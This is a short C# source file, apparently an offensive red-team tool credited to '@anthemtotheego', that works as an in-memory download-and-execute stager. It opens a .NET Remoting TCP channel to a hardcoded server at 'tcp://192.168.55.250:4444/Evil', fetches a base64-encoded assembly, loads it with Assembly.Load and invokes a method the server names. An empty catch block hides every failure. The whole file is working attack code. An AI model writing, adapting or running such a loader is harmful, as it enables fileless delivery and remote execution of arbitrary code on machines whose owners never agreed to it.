using System;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Reflection;

/*
Author: @anthemtotheego
License: BSD 3-Clause    
*/

class Program
{
    public static void Main()
    {
        try
        {
            //TCP Channel
            TcpClientChannel clientChannel = new TcpClientChannel();
            ChannelServices.RegisterChannel(clientChannel, false);

            //Create an instance of remoteObject
            Type Type = typeof(Interface);
            Interface remoteObject = (Interface)Activator.GetObject(Type, "tcp://192.168.55.250:4444/Evil");

            //Return source from server
            String[] source = remoteObject.b64Assembly2();

            //Decode and load assembly
            var decode = Convert.FromBase64String(source[0]);
            var assemblyLoad = Assembly.Load(decode);

            //Get types, create instance, and execute
            Type[] type = assemblyLoad.GetTypes();
            int x = Convert.ToInt32(source[1]);
            object o = Activator.CreateInstance(type[x]);
            object[] arguements = new object[] { new string[] { source[2] } };
            type[x].GetMethod(source[3]).Invoke(o, arguements);
        }
        catch
        { }
    }
}

//Public Interface
public interface Interface
{
    String[] b64Assembly2();
}
